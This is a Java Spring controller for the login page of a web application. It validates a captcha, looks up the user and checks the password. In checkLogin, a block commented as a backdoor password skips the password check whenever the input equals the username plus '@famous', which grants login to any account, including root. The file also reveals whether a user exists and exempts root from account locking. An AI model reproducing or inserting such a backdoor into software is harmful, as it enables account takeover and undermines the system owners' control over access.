package com.pinde.sci.ctrl.inx;

import java.util.Date;
import java.util.List;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.pinde.core.page.PageHelper;
import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.edc.IProjUserBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.model.mo.InxInfo;
import com.pinde.sci.model.mo.PubProjUser;
import com.pinde.sci.model.mo.ResDoctor;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysRole;
import com.pinde.sci.model.mo.SysUser;
import com.pinde.sci.model.mo.SysUserRole;

@Controller
@RequestMapping("/inx/enso")
public class InxEnsoController extends GeneralController{
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IProjUserBiz projUserBiz;
	
	
	
	
	@RequestMapping(value="",method={RequestMethod.GET})
	public String index(Model model){
		return "inx/enso/index";
	}
	
	
	
	private Object checkLogin(String userCode, String userPasswd,String verifyCode){
		String loginErrorMessage = "";
		//默认登录失败界面
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //验证码输入不能为空，不区分大小写
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			loginErrorMessage = "验证码不正确";
			return loginErrorMessage;
		}
		 //登录码不能为空
		if (StringUtil.isBlank(userCode)){
			loginErrorMessage = "用户名不能为空";
			return loginErrorMessage;
		}
		//密码不能为空
		if (StringUtil.isBlank(userPasswd)){
			loginErrorMessage = SpringUtil.getMessage("userPasswd.isNull");
			return loginErrorMessage;
		}
		//查是否存在此用户
		userCode = userCode.trim();
		SysUser user = userBiz.findByUserEmail(userCode);
		if(user==null){
			user = userBiz.findByUserPhone(userCode);
		}
		if(user==null){
			user = userBiz.findByUserCode(userCode);
		}
		if(user==null){
			user = userBiz.findByIdNo(userCode);
		}
		if(user==null){
			loginErrorMessage = "用户不存在!";
			return loginErrorMessage;
		}
		
		//root用户不判断是否锁定
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			if(UserStatusEnum.Locked.getId().equals(user.getStatusId())){
				loginErrorMessage = SpringUtil.getMessage("userCode.locked");
				return loginErrorMessage;
			}
		}
		
		//后门密码
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@famous")){
			//判断密码
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd.trim()))){
				loginErrorMessage = "账号或密码不正确！";
				return loginErrorMessage;
			}			
		}	
		return user;
	}

	/**
	 * 登录
	 */
	@RequestMapping(value="/login",method={RequestMethod.POST})
	public String login(String userCode, String userPasswd,String verifyCode ,String errorLoginPage,Model model,HttpServletRequest request){
		//默认登录失败界面
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "inx/enso/index";
		}
        Object obj = checkLogin(userCode, userPasswd, verifyCode);
        if(obj instanceof String){
        	model.addAttribute("loginErrorMessage", obj) ;
        	return errorLoginPage;
        }
        SysUser user = null;
        if(obj instanceof SysUser){
        	user = (SysUser)obj;
        }
		//设置当前用户
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);	
		
		if(GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			return "redirect:/main?time="+new Date();
		}
		
		//在线用户功能使用
		SessionData sessionData = new SessionData();
		sessionData.setSysUser(user);
		sessionData.setIp(request.getRemoteAddr());
		long now = System.currentTimeMillis();
		String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
		sessionData.setLoginTime(loginTime);
		setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
		
		//记录日志
		SysLog log = new SysLog();
		//log.setReqTypeId(ReqTypeEnum.GET.getId());
		log.setOperId(OperTypeEnum.LogIn.getId());
		log.setOperName(OperTypeEnum.LogIn.getName());
		log.setLogDesc("登录IP["+request.getRemoteAddr()+"]");
		log.setWsId(GlobalConstant.SYS_WS_ID);
		GeneralMethod.addSysLog(log);
		logMapper.insert(log);
		
		
//		PubProjUser projUser = new PubProjUser();
//		projUser.setUserFlow(user.getUserFlow());
//		userRole.setWsId(GlobalConstant.EDC_WS_ID);
//		List<PubProjUser> projUserList = projUserBiz.search(projUser);
//		if(projUserList==null || projUserList.size()==0){
//			model.addAttribute("loginErrorMessage","角色未赋权!");
//			return errorLoginPage;
//		}else {
//			model.addAttribute("projFlow",projUserList.get(0).getProjFlow());
			//return "redirect:/enso/main/"+projUserList.get(0).getRoleFlow();
			return "redirect:/medroad/main";
//		}
	}
	
}
